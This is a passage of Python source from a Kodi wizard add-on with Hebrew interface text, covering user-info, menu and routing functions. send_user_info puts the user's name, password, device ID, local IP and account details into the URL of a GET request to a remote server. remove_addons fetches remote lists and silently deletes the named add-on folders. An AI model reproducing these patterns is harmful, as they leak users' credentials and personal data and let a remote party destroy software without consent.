            x=requests.get(error_ad+que(txt)+'\n'+que('שם משתמש: #')+userr+'\n'+que('קוד מכשיר: ')+(wiz.getS('action'))+'\n'+que('סיסמה: ')+passs+'\n'+que('מנוי: ')+userdate+'\n'+que('כמות מכשירים: ')+str(device_cunt)+'\n'+que('קודי: ')+kodiinfo+'\n'+que('כתובת: ')+local_ip+'\n'+que('מערכת הפעלה: ')+platform_d()+'\n'+id_name+'\n'+id_device+'\n'+que('גירסת ויזארד: ')+VERSION+'\n'+device_backup+'\n'+update+'\n'+rd+'\n'+tele+'\n'+que('proxies'), proxies=proxies).json()
          if 'בקשה לפתיחת תוכן טורקי ' in txt:
            if wiz.getS('dragon')=='true':
                x=requests.get(error_ad + '@@@'+txt.replace('בקשה לפתיחת תוכן טורקי ',''), proxies=proxies).json()
          if 'התקנה חדשה - קוד מכשיר:' in txt:
                x=requests.get(error_ad + txt.replace('התקנה חדשה - קוד מכשיר:',''), proxies=proxies).json()
          if 'התקנה חדשה' == txt:
                x=requests.get(error_ad+wiz.getS('action'), proxies=proxies).json()
          if 'no_code' == txt:
                x=requests.get(error_ad+que('no_code'), proxies=proxies).json()
          if 'מזהה מכשיר' in txt:

                x=requests.get(error_ad+serialnumber.lower(), proxies=proxies).json()
          if 'מעוניין לרשום מכשיר' in txt:
                x=requests.get(error_ad+serialnumber.lower(), proxies=proxies).json()
def startup():
   try:
        my_tmdb=tmdb_list(TMDB_NEW_API)
        num=str((getHwAddr('eth0'))*my_tmdb)
        new_num=(num[1]+num[2]+num[5]+num[7])
        wiz.setS('action', str(new_num))
        send_user_info('channel_new_install','התקנה חדשה')
   except: 
        send_user_info('channel_new_install','no_code')
# startup()
def get_version_update():
    if os.path.exists(os.path.join(ADDONS, 'skin.anonymoustv')):
        setting_file=os.path.join(translatepath("special://home/"),"addons","skin.anonymoustv","xml","fastupdate_date.xml")
    file = open(setting_file, 'r', encoding='utf-8') 
    file_data= file.read()
    file.close()

    regex='<!-- 2 --><label>(.+?)</label>'
    up=re.compile(regex).findall(file_data)[0]
    return up

def user_info():
    import threading
    from threading import Thread
    xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
    resuaddon=xbmcaddon.Addon('plugin.video.telemedia')
    Settingz=xbmcaddon.Addon('plugin.program.Settingz-Anon')
    Settingz=Settingz.getSetting('user_name')
    listen_port=resuaddon.getSetting('port')
    user= (wiz.getS("user"))
    if wiz.getS('serialnumber')=='':
        xbmc.executebuiltin('Skin.SetString(serial, true')
        serialnumber='מכשיר רשום במערכת: '+'לא רשום'
    else:
        serialnumber='מכשיר רשום במערכת: '+wiz.getS('serialnumber')
    usn=[]
    match=[]
    match2=[]
    
    try:
        all_db=read_skin('playback')
        all_db_dragon=read_skin_dragon('playback')
        ssss=[all_db,all_db_dragon]
        for i in ssss:
            for itt in i:
                items=i[itt]
                try:
                    match.append((items['name'],items['date'],items['sync'],items['dragon'],items['device'],items['rduser'],items['rdpass'],items['telegram_user'],items['p1'],items['p2'],items['p3']))
                except:
                    match2.append((items['name'],items['date'],items['sync'],items['dragon'],items['device']))

        for name,date,sync,dragon,device,rduser,rdpass,telegram_user,p1,p2,p3 in match:

            if name.split()[0].lower()==user:
                found=1
                wiz.setS("date_user",date.replace(' ',''))
        for name,date,sync,dragon,device in match2:

            if name.split()[0].lower()==user:
                found=1
                wiz.setS("date_user",date.replace(' ',''))
    except:pass
    try:

        import requests
        num=random.randint(1,1001)
        data={'type':'td_send',
                     'info':json.dumps({'@type': 'getOption','name':'my_id', '@extra': num})
                     }
        event2=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        my_id=event2['value']
        if '1229060184'== my_id :
          tele='חשבון טלמדיה: VIP-D'
        elif '838481324'== my_id :
          tele='חשבון טלמדיה: VIP-N'
        elif '5667480303'== my_id:
          tele='חשבון טלמדיה: VIP-S'
        elif '5771387214'== my_id:
          tele='חשבון טלמדיה: VIP-K'
        elif '5984604232'== my_id:
          tele='חשבון טלמדיה: VIP-L'
        elif '5941680786'== my_id:
          tele='חשבון טלמדיה: VIP-T'
        elif '6022195851'== my_id:
          tele='חשבון טלמדיה: VIP-O'
        elif '6217448590'== my_id:
          tele='חשבון טלמדיה: VIP-A'
        else:
          tele='חשבון טלמדיה: אישי'
    except:
          tele='חשבון טלמדיה: אינו פעיל'
    if wiz.getS('dragon')=='true':
        userdate='תקופת המנוי ב Kodi Dragon תסתיים בתאריך: '+wiz.getS("date_user")
    else:
        userdate='תקופת המנוי Anonymous TV תסתיים בתאריך: '+wiz.getS("date_user")
    rd_check=''
    if os.path.exists(translatepath("special://home/addons/") + 'plugin.video.kitana'):
        resuaddon=xbmcaddon.Addon('plugin.video.kitana')
        # rd_check=resuaddon.getSetting('rd.token')
        if len(resuaddon.getSetting('rd.token'))>0:
            rd_check='true'
    elif os.path.exists(translatepath("special://home/addons/") + 'plugin.video.cobra'):
        resuaddon=xbmcaddon.Addon('plugin.video.cobra')
        # rd_check=resuaddon.getSetting('rd.token')
        if len(resuaddon.getSetting('rd.token'))>0:
            rd_check='true'
    if rd_check=='true':
        try:
            from resources.libs import details_realdebrid
            ssaa=details_realdebrid.RealDebrid().account_info_to_dialog()
            rd='שירות RD: פעיל - '+str(ssaa).replace(')','').replace('(','').replace("'","")
        except:
            rd='שירות Real-Debrid: פעיל'
    else:
      rd='שירות Real-Debrid: אינו פעיל'
    up=get_version_update()
    update='גירסת מערכת: '+up
    username='שם משתמש: '+wiz.getS('user')
    device='כמות מכשירים: '+wiz.getS("device")
    wiz.setS("update",update)
    wiz.setS("tele_info",tele)
    wiz.setS("rd_info",rd)
    if len(Settingz)>0:

        wiz.setS('device_backup','true')
        wiz.setS("device_backup_name",Settingz)
        device_backup= 'גיבוי מערכת: פעיל - ' + ' שם הגיבוי הוא: ' + Settingz
    else:
        device_backup='גיבוי מערכת: לא פעיל'
    xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
    t = Thread(target=send_user_info, args=('channel_new_install','לחץ על החשבון שלי',))
    t.start()
    user_info_Window(tele,update,rd,userdate,username,device,device_backup,serialnumber)

def addDir(display, mode=None, name=None, url=None, menu=None, description=ADDONTITLE, overwrite=True, fanart=FANART, icon=ICON, themeit=None):
    u = sys.argv[0]
    if not mode == None: u += "?mode=%s" % que(mode)
    if not name == None: u += "&name="+que(name)
    if not url == None: u += "&url="+que(url)
    ok=True
    if themeit: display = themeit % display
    try:
      liz=xbmcgui.ListItem(display, iconImage="DefaultFolder.png", thumbnailImage=icon)
    except:
      liz=xbmcgui.ListItem(display)
      liz.setArt({'thumb' : icon, 'fanart': icon, 'DefaultFolder.png': icon})
    liz.setInfo( type="Video", infoLabels={ "Title": display, "Plot": description} )
    liz.setProperty( "Fanart_Image", fanart )
    if not menu == None: liz.addContextMenuItems(menu, replaceItems=overwrite)
    ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=True)
    return ok

def addFile(display, mode=None, name=None, url=None, menu=None, description=ADDONTITLE, overwrite=True, fanart=FANART, icon=ICON, themeit=None):
    u = sys.argv[0]
    try:
        if not mode == None: u += "?mode=%s" % que(mode)
        if not name == None: u += "&name="+que(name)
        if not url == None: u += "&url="+que(url)
    except:#kodi19
        if not mode == None: u += "?mode=%s" % que(mode)
        if not name == None: u += "&name="+que(name)
        if not url == None: u += "&url="+que(url)
    ok=True
    if themeit: display = themeit % display
    try:
        liz=xbmcgui.ListItem(display, iconImage="DefaultFolder.png", thumbnailImage=icon)
    except:
        liz=xbmcgui.ListItem(display)
        liz.setArt({'thumb' : icon, 'fanart': icon, 'DefaultFolder.png': icon})
    liz.setInfo( type="Video", infoLabels={ "Title": display, "Plot": description} )
    liz.setProperty( "Fanart_Image", fanart )
    if not menu == None: liz.addContextMenuItems(menu, replaceItems=overwrite)
    ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=False)
    return ok

def get_params(user_params=''):
       
        param = dict(parse_qsl(user_params.replace('?','')))
        return param   
def remove_addons():
	try:
			import json
			r = urlopen(remove_url).readlines()
			for line in r:
				
				add_name =line.decode('utf-8').split(':')[1].strip()
				do_json = '{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}' % (add_name, 'false')
				query = xbmc.executeJSONRPC(do_json)
				response = json.loads(query)
				
				url_folder=os.path.join(addons_folder,add_name)
				
				if os.path.exists(url_folder):
					for root, dirs, files in os.walk(url_folder):
						for f in files:
							os.unlink(os.path.join(root, f))
						for d in dirs:
							shutil.rmtree(os.path.join(root, d))
					os.rmdir(url_folder)

			xbmc.executebuiltin('Container.Refresh')
			xbmc.executebuiltin("UpdateLocalAddons()")
			xbmc.executebuiltin('Container.Update(%s)' % xbmc.getInfoLabel('Container.FolderPath'))
	except:  pass

def remove_addons2():
	try:
			import json
			r = urlopen(remove_url2).readlines()
			for line in r:
				
				add_name =line.split(':')[1].strip() 
				do_json = '{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}' % (add_name, 'false')
				query = xbmc.executeJSONRPC(do_json)
				response = json.loads(query)
				
				url_folder2=os.path.join(user_folder,add_name)
				
				if os.path.exists(url_folder2):
					for root, dirs, files in os.walk(url_folder2):
						for f in files:
							os.unlink(os.path.join(root, f))
						for d in dirs:
							shutil.rmtree(os.path.join(root, d))
					os.rmdir(url_folder2)

	except:  pass


def refresh_list(user_params,sys_arg_1_data,Addon_id=""):
    global name
    params=get_params(user_params=user_params)
    url=None
    name=None
    mode=None
    try:     mode=unque(params["mode"])
    except:  pass
    try:     name=unque(params["name"])
    except:  pass
    try:     url=unque(params["url"])
    except:  pass
    if   mode==None             : buildMenu()#index()
    elif mode=='user_info'      : user_info()
    elif mode=='STARTP'         : STARTP()
    elif mode=='install'        : buildWizard(name, url)
    elif mode=='kodi17fix'      : wiz.kodi17Fix()
    elif mode=='clearbackup'    : wiz.cleanupBackup()
    elif mode=='currentsettings': viewAdvanced()
    elif mode=='fullclean'      : totalClean(); wiz.refresh()
    elif mode=='logsend'        : logsend()
    elif mode=='clearpackages'  : wiz.clearPackages(); wiz.refresh()
    elif mode=='clearcrash'     : wiz.clearCrash(); wiz.refresh()
    elif mode=='clearthumb'     : clearThumb(); wiz.refresh()
    elif mode=='freshstart'     : freshStart()
    elif mode=='testapk'        : notify.apkInstaller('SPMC')
    elif mode=='help_install'        : help_install()
    elif mode=='infoupdate'        : infobuild(False)
    elif mode=='infoupdate_busydialog'        : infoupdate_busydialog(False)
    elif mode=='wait'        : wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]אנא המתן[/COLOR]" % COLOR2,1500)
    elif mode=='tv_widget_tele'   :tv_widget_tele(notify='true')
    elif mode=='tv_widget_kitana'   :tv_widget_kitana(notify='true')
    elif mode=='force_update'   :force_update()
    elif mode=='update_tele'   :auto_build_update(NOTEID)
    elif mode=='passandUsername'       : ADDON.openSettings()

    elif mode=='80'        : send_user_info('channel_new_install','שלח קוד')
    elif mode=='fixskin'        : backtokodi()
    elif mode=='check_id'        : check_id('true')
    elif mode=='startup'        : startup()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))